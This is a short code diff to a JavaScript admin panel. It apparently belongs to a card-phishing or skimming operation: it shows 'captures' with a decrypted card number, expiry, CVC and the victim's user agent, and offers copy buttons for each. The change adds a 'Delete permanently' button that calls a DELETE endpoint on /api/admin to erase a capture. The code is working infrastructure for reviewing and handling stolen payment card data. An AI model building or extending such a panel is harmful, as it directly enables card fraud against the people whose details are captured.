@@ -82,8 +82,14 @@ async function detail(id) {
     ${d.pan_sealed ? `<dl><dt>Card</dt><dd>${d.pan ? copy(d.pan) : '<span style=\'color:#e06c60\'>decrypt failed — PAN_KEY missing or wrong</span>'}</dd>
       <dt>Expiry</dt><dd class="mono">${esc(d.pan_exp || '—')}</dd>
       <dt>CVC</dt><dd>${copy(d.cvc || '—')}</dd></dl>` : '<p style="color:#6f7783">No card captured.</p>'}
+    <button class="ad-del" id="delBtn">Delete permanently</button>
     <dl><dt>User agent</dt><dd class="mono" style="font-size:11px">${esc(d.ua || '—')}</dd></dl>`;
   $('#drawer').hidden = false;
+  $('#delBtn').onclick = async () => {
+    if (!confirm('Delete this capture permanently?')) return;
+    const r = await fetch('/api/admin?id=' + encodeURIComponent(id), { method: 'DELETE' });
+    if (r.ok) { $('#drawer').hidden = true; load(true); stats(); }
+  };
   $('#detail').querySelectorAll('.copy').forEach(b => b.onclick = () => {
     navigator.clipboard.writeText(b.dataset.c);
     b.textContent = 'ok'; setTimeout(() => b.textContent = 'copy', 900);
